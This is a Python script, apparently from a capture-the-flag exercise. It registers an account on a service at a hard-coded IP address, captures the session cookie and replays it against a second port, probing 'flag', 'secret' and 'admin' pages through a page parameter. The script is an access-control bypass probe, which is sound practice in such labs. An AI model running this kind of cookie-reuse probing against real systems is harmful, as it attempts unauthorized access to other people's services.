import http.client, json, urllib.request

host = "164.92.126.208"

# Step 1: Register a user
print("=== Step 1: Register ===")
conn = http.client.HTTPConnection(host, 5003, timeout=5)
conn.request("POST", "/register",
             json.dumps({"username": "myuser123", "password": "mypass123"}),
             {"Content-Type": "application/json"})
resp = conn.getresponse()
body = resp.read().decode("utf-8", errors="replace")
print(f"Status: {resp.status}")
print(f"Body: {body}")
conn.close()

# Step 2: Login and get session cookie
print("\n=== Step 2: Login ===")
conn = http.client.HTTPConnection(host, 5003, timeout=5)
conn.request("POST", "/login",
             json.dumps({"username": "myuser123", "password": "mypass123"}),
             {"Content-Type": "application/json"})
resp = conn.getresponse()
body = resp.read().decode("utf-8", errors="replace")
print(f"Status: {resp.status}")
print(f"Location: {resp.getheader('Location')}")
session_cookie = resp.getheader('Set-Cookie')
print(f"Session: {session_cookie[:80]}...")
conn.close()

# Step 3: Access logged-in area on port 5003
if session_cookie:
    print("\n=== Step 3: Access /profile on port 5003 ===")
    conn = http.client.HTTPConnection(host, 5003, timeout=5)
    # Extract just the cookie name=value part
    cookie_val = session_cookie.split(';')[0]
    print(f"Using cookie: {cookie_val}")
    conn.request("GET", "/profile", headers={"Cookie": cookie_val})
    resp = conn.getresponse()
    body = resp.read().decode("utf-8", errors="replace")
    print(f"Status: {resp.status}")
    clean = body.encode("ascii", errors="replace").decode("ascii")
    print(f"Body: {clean[:500]}")
    conn.close()

    # Step 4: Try to access port 5002 with same cookie
    print("\n=== Step 4: Try same cookie on port 5002 ===")
    conn = http.client.HTTPConnection(host, 5002, timeout=5)
    conn.request("GET", "/?page=flag", headers={"Cookie": cookie_val})
    resp = conn.getresponse()
    body = resp.read().decode("utf-8", errors="replace")
    print(f"Status: {resp.status}")
    if "Access Denied" in body:
        print("  Still blocked")
    elif resp.status == 200:
        clean = body.encode("ascii", errors="replace").decode("ascii")
        print(f"  Body: {clean[:200]}")
    conn.close()
    
    # Step 5: Try all pages on port 5002 with session
    print("\n=== Step 5: Try pages on port 5002 with session ===")
    for page in ["flag", "flag.php", "secret", "admin"]:
        conn = http.client.HTTPConnection(host, 5002, timeout=5)
        conn.request("GET", f"/?page={page}", headers={"Cookie": cookie_val})
        resp = conn.getresponse()
        body = resp.read().decode("utf-8", errors="replace")
        if resp.status == 200:
            clean = body.encode("ascii", errors="replace").decode("ascii")
            print(f"  200: {page} -> {clean[:100]}")
        else:
            print(f"  {resp.status}: {page}")
        conn.close()
